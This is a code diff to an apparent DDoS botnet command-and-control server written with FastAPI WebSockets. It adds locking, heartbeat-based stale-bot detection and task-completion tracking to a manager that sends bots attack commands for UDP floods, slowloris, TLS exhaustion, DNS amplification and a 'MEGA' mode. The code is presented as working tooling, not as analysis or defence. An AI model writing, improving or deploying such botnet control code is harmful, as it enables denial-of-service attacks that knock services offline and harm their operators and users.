@@ -1,5 +1,6 @@
 import json
-from datetime import datetime, timezone
+import asyncio
+from datetime import datetime, timezone, timedelta
 from typing import Dict, Optional
 from uuid import UUID
 from fastapi import WebSocket, WebSocketDisconnect
@@ -17,37 +18,89 @@ def _try_uuid(val: str) -> Optional[UUID]:
 class BotConnectionManager:
     def __init__(self):
         self.active: Dict[str, WebSocket] = {}
-        # bot_id -> last cumulative packets/bytes (for delta stats)
         self._last_stats: Dict[str, tuple] = {}
+        self._lock = asyncio.Lock()
+        # Track last heartbeat time for stale detection
+        self._last_heartbeat: Dict[str, datetime] = {}
+        self._hb_task = None
+
+    async def _start_heartbeat_checker(self):
+        while True:
+            await asyncio.sleep(15)
+            cutoff = datetime.now(timezone.utc) - timedelta(seconds=60)
+            async with self._lock:
+                stale = [k for k, t in list(self._last_heartbeat.items()) if t < cutoff]
+                for k in stale:
+                    ws = self.active.get(k)
+                    if ws:
+                        try:
+                            await ws.close()
+                        except Exception:
+                            pass
+                    self.active.pop(k, None)
+                    self._last_stats.pop(k, None)
+                    self._last_heartbeat.pop(k, None)
+                    uid = _try_uuid(k)
+                    if uid:
+                        try:
+                            await BotService.set_status(uid, "offline")
+                        except Exception:
+                            pass
 
     async def connect(self, ws: WebSocket, bot_id: str):
         await ws.accept()
-        # Replace previous connection for same id
-        old = self.active.get(bot_id)
-        if old and old is not ws:
-            try: await old.close()
-            except: pass
-        self.active[bot_id] = ws
+        async with self._lock:
+            old = self.active.get(bot_id)
+            if old and old is not ws:
+                try:
+                    await old.close()
+                except Exception:
+                    pass
+            self.active[bot_id] = ws
+            self._last_heartbeat[bot_id] = datetime.now(timezone.utc)
+            # Start background heartbeat checker once
+            if self._hb_task is None:
+                self._hb_task = asyncio.create_task(self._start_heartbeat_checker())
         uid = _try_uuid(bot_id)
         if uid:
-            try: await BotService.set_status(uid, "online")
-            except: pass
+            try:
+                await BotService.set_status(uid, "online")
+            except Exception:
+                pass
 
-    async def disconnect(self, bot_id: str):
-        self.active.pop(bot_id, None)
-        self._last_stats.pop(bot_id, None)
-        uid = _try_uuid(bot_id)
-        if uid:
-            try: await BotService.set_status(uid, "offline")
-            except: pass
+    async def disconnect(self, bot_id: str, ws: Optional[WebSocket] = None):
+        async with self._lock:
+            key = str(bot_id)
+            cur = self.active.get(key)
+            if ws is not None and cur is not None and cur is not ws:
+                return
+            if key in self.active and (ws is None or self.active[key] is ws):
+                self.active.pop(key, None)
+                self._last_stats.pop(key, None)
+                self._last_heartbeat.pop(key, None)
+                uid = _try_uuid(key)
+                if uid:
+                    try:
+                        await BotService.set_status(uid, "offline")
+                    except Exception:
+                        pass
 
-    def rebind(self, old_key: str, new_key: str, ws: WebSocket):
-        """Rebind connection key after handshake (URL uuid -> DB bot.id)."""
-        if old_key != new_key:
-            self.active.pop(old_key, None)
-            if old_key in self._last_stats:
-                self._last_stats[new_key] = self._last_stats.pop(old_key)
-        self.active[new_key] = ws
+    async def rebind(self, old_key: str, new_key: str, ws: WebSocket):
+        async with self._lock:
+            if old_key != new_key:
+                if self.active.get(old_key) is ws:
+                    self.active.pop(old_key, None)
+                    self._last_heartbeat.pop(old_key, None)
+                if old_key in self._last_stats:
+                    self._last_stats[new_key] = self._last_stats.pop(old_key)
+            existing = self.active.get(new_key)
+            if existing is not None and existing is not ws:
+                try:
+                    await existing.close()
+                except Exception:
+                    pass
+            self.active[new_key] = ws
+            self._last_heartbeat[new_key] = datetime.now(timezone.utc)
 
     async def send_json(self, bot_id: str, data: dict):
         key = str(bot_id)
@@ -57,7 +110,8 @@ class BotConnectionManager:
         try:
             await ws.send_json(data)
         except Exception:
-            await self.disconnect(key)
+            # Only disconnect on permanent failures, not transient ones
+            await self.disconnect(key, ws)
 
     async def send_attack_command(self, bot_id: str, task: dict):
         method = (task.get("method") or "UDP").upper()
@@ -66,7 +120,6 @@ class BotConnectionManager:
             "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
             "tls_exhaust": 1 if method == "TLS_EXHAUST" or task.get("tls_exhaust") else 0,
             "dns_amp": 1 if method == "DNS_AMP" or task.get("dns_amp") else 0,
-            "game_mimic": 1 if method == "GAME_MIMIC" or task.get("game_mimic") else 0,
             "mega_mode": 1 if method == "MEGA" or task.get("mega_mode") else 0,
         }
         await self.send_json(bot_id, {
@@ -190,7 +243,7 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                             bot.bot_version = data.get("version")
                         await s.commit()
 
-                manager.rebind(session_key, db_id, ws)
+                await manager.rebind(session_key, db_id, ws)
                 session_key = db_id
                 await ws.send_json({
                     "type": "handshake_ack",
@@ -205,7 +258,8 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                 uid = _try_uuid(session_key)
                 if uid:
                     await BotService.update_heartbeat(uid, data)
-                # Reply so bot knows connection is alive (prevents stale disconnect)
+                # Track for stale detection
+                manager._last_heartbeat[session_key] = datetime.now(timezone.utc)
                 try:
                     await ws.send_json({"type": "heartbeat_ack", "timestamp": data.get("timestamp")})
                 except Exception:
@@ -244,10 +298,18 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
                             select(AttackTask).where(AttackTask.id == tid, AttackTask.status == "running")
                         )).scalar_one_or_none()
                         if task:
-                            # Only complete if no other bots still active — simple: leave for stop/timeout
-                            pass
+                            active_ids = task.bot_ids or []
+                            online = [bid for bid in active_ids if str(bid) in manager.active]
+                            if len(online) <= 1:
+                                task.status = "completed"
+                                task.completed_at = datetime.now(timezone.utc)
+                                await s.commit()
 
     except WebSocketDisconnect:
-        await manager.disconnect(session_key)
-    except Exception:
-        await manager.disconnect(session_key)
+        await manager.disconnect(session_key, ws)
+    except Exception as e:
+        print(f"[WS] bot {session_key} error: {e}")
+        try:
+            await manager.disconnect(session_key, ws)
+        except Exception:
+            pass
